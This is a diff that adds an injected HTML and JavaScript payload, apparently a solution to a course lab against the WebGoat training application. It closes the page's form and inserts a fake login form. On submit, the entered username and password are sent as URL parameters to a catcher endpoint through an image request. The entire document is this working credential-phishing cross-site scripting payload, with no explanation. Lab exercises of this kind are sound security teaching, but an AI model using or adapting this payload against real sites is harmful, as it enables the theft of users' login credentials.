@@ -1,0 +1,17 @@
+</form>
+<script>
+  function captureCredentials() {
+    let captureImage = new Image();
+    let username = document.getElementById("ece568_2022s_user").value;
+    let password = document.getElementById("ece568_2022s_pw").value;
+    let maliciousURL = "http://localhost:9867/WebGoat/catcher?PROPERTY=yes&phishingUsername=" + username + "&phishingPassword=" + password;
+    captureImage.src = maliciousURL;
+  }
+</script>
+
+<form name="loginForm">
+    <br><HR><H3>Please enter your username and password:</H3>
+    <br>Enter Username:<br><input type="text" id="ece568_2022s_user" name="username">
+    <br>Enter Password:<br><input type="text" id="ece568_2022s_pw" name = "password">
+    <br><button type="submit" id="ece568_2022s_submit" onclick="captureCredentials()">Login</button>
+</form>
